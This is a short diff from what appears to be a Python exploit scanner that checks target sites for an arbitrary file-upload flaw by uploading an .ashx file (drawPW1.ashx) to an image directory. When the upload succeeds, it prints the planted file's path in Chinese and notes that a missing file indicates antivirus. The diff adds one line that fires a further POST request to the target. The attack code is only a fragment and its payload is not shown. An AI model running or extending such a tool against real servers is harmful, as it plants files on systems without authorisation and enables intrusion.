@@ -141,6 +141,7 @@ def upload(url):
             if "success" in res2.text:
                 output = "[+]存在drawPW文件上传:"+url+"/Content/img/UserDraw/drawPW1.ashx,不存在则有杀软"
                 print("\033[91m%s\033[0m"%(output))
+                requests.post(url=url1, headers=headers, data=data, timeout=3, verify=False)
                 return output
             else:
                 return "none"
